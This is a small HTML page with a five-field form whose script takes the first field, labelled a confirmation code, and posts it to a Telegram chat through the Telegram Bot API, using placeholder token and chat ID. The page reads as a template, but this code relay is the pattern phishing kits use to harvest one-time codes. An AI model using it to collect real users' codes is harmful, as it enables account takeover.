<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Bot Form</title>
</head>
<body>
    <form id="telegramForm">
        <input type="text" name="field1" placeholder="Field 1" required><br>
        <input type="text" name="field2" placeholder="Field 2" required><br>
        <input type="text" name="field3" placeholder="Field 3" required><br>
        <input type="text" name="field4" placeholder="Field 4" required><br>
        <input type="text" name="field5" placeholder="Field 5" required><br>
        <button type="submit">Submit</button>
    </form>

    <script>
        document.getElementById('telegramForm').addEventListener('submit', function(event) {
            event.preventDefault();

            // Assuming field1 is the confirmation code
            let confirmationCode = new FormData(this).get('field1');
            sendConfirmationCodeToTelegramBot(confirmationCode);
        });

        function sendConfirmationCodeToTelegramBot(confirmationCode) {
            const botToken = 'YOUR_BOT_TOKEN_HERE'; // Replace with your Telegram bot token
            const chatId = 'YOUR_CHAT_ID_HERE'; // Replace with your Telegram chat ID
            const message = `Confirmation Code: ${confirmationCode}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                alert('Confirmation code sent to Telegram bot!');
            })
            .catch(error => {
                alert('Error sending data to Telegram bot!');
                console.error(error);
            });
        }
    </script>
</body>
</html>
